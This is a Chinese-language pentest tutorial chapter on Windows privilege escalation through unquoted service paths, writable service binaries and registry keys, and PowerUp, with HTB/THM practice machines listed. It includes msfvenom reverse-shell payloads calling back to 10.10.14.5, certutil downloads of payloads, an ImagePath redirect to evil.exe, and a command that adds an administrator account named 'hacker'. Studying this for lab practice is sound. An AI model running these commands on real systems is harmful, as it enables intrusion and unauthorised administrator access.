# Ch 26 — 服務濫用：不安全路徑 + 弱服務權限

> 目標：找到 Windows 服務的弱點——不安全路徑（Unquoted Service Path）和弱服務二進位權限——並利用它們提權。

## Windows 服務的提權原理

Windows 服務（Service）通常以 SYSTEM 或管理員身份執行。如果：
1. 服務的執行檔路徑你能替換
2. 或服務的登錄設定你能修改
3. 或服務路徑沒有加引號導致解析歧義

你就能讓服務跑你的惡意程式。

## Unquoted Service Path（不安全的未引號路徑）

### 原理

Windows 解析含空格路徑的邏輯：

```
服務路徑：C:\Program Files\My Software\service.exe

沒有引號時，Windows 依序嘗試：
  1. C:\Program.exe Files\My Software\service.exe
  2. C:\Program Files\My.exe Software\service.exe
  3. C:\Program Files\My Software\service.exe

如果你能在 C:\Program.exe 或 C:\Program Files\My.exe 放一個同名 binary
→ 服務啟動時就會執行你的程式
```

### 找未引號的服務路徑

```cmd
# 方法一：wmic
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"

# 方法二：sc qc
sc qc "ServiceName"
# 看 BINARY_PATH_NAME，如果有空格但沒有引號 → 可疑

# PowerShell（更清楚）
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notmatch '"' -and $_.PathName -match ' '
} | Select Name, PathName, StartMode, State
```

輸出範例（可利用）：

```
Name: VulnService
PathName: C:\Program Files\Vuln App\vulnerable.exe
```

### 利用步驟

```bash
# 1. 找到 C:\Program Files\Vuln.exe 的目錄是否可寫
icacls "C:\Program Files" 2>nul

# 2. 生成惡意 binary
# 在 Kali：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Vuln.exe

# 3. 傳到靶機
certutil -urlcache -f http://10.10.14.5/Vuln.exe "C:\Program Files\Vuln.exe"

# 4. 重啟服務（如果你有權限）
sc stop VulnService
sc start VulnService

# 或等待系統重開機（通常靶機不讓你重開）
```

## 弱服務二進位權限

### 原理

服務的執行檔本身你能覆蓋或修改。

### 找可修改的服務 binary

```cmd
# 用 icacls 逐一檢查服務路徑
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "C:\windows"') do (
    icacls "%a" 2>nul | findstr /i "(F) (M) (W) :\"
)
```

或用 PowerShell（更清楚）：

```powershell
Get-WmiObject -Class Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"',''
    $path = $path -replace '/\S+ .*',''
    if (Test-Path $path) {
        $acl = Get-Acl $path
        $acl.Access | Where-Object {
            $_.IdentityReference -match "Everyone|Users|Authenticated Users" -and
            $_.FileSystemRights -match "FullControl|Modify|Write"
        } | ForEach-Object {
            [pscustomobject]@{Service=$_.($_.PathName); Permission=$_.FileSystemRights}
        }
    }
}
```

### 利用步驟

```bash
# 1. 確認目標服務的 binary 可寫
icacls "C:\vuln_service\service.exe"
# BUILTIN\Users:(F)   ← 所有使用者有完整控制 → 可利用

# 2. 備份原始 binary（避免系統不穩定）
copy "C:\vuln_service\service.exe" "C:\vuln_service\service.exe.bak"

# 3. 替換成惡意 binary
# 先在 Kali 生成：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o service.exe
# 傳到靶機：
certutil -urlcache -f http://10.10.14.5/service.exe "C:\vuln_service\service.exe"

# 4. 重啟服務
sc stop VulnService
sc start VulnService
```

## 弱服務登錄權限

服務設定存在 Registry，如果你能修改服務的登錄：

```cmd
# 用 subinacl.exe 或 Get-Acl 確認
reg query "HKLM\SYSTEM\CurrentControlSet\Services\VulnService"
```

可以修改 `ImagePath`（binary 路徑）指向你的惡意程式：

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\evil.exe" /f
sc start VulnService
```

## PowerUp 自動化

```powershell
# 下載 PowerUp
certutil -urlcache -f http://10.10.14.5/PowerUp.ps1 C:\Windows\Temp\PowerUp.ps1

# 執行
Import-Module C:\Windows\Temp\PowerUp.ps1
Invoke-AllChecks

# 重點看：
# [*] Checking for unquoted service paths...
# [*] Checking for modifiable service files...
# [*] Checking for modifiable services...
```

PowerUp 找到可利用的服務後，通常有 `Write-ServiceBinary` 或 `Install-ServiceBinary` 自動利用的函數。

### 自動利用（PowerUp）

```powershell
# 找到服務漏洞後
Write-ServiceBinary -Name VulnService -Command "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"

# 重啟服務
sc.exe start VulnService

# 確認新增了管理員帳號
net user hacker
net localgroup administrators
```

## 本章對應靶機

| 機器 | 服務漏洞類型 |
|------|------------|
| HTB Devel | IIS（不是服務漏洞，但練 Windows 提權） |
| HTB Optimum | 服務漏洞 + MS16-032 |
| THM Steel Mountain | Unquoted Service Path + Weak Permissions |
| THM Windows Privesc | 整合練習 |

**推薦練習**：THM Steel Mountain，這台機器的主要提權路徑就是 Unquoted Service Path。

## 自我檢核

- [ ] 能用 `wmic service get` 找未引號的服務路徑
- [ ] 能解釋 Unquoted Service Path 的利用邏輯
- [ ] 能用 `icacls` 確認服務 binary 的寫入權限
- [ ] 知道 PowerUp 的 `Invoke-AllChecks` 能自動找服務漏洞

→ [Ch 27 Token 竊取：SeImpersonatePrivilege + Potato](./27-token-impersonation.md)
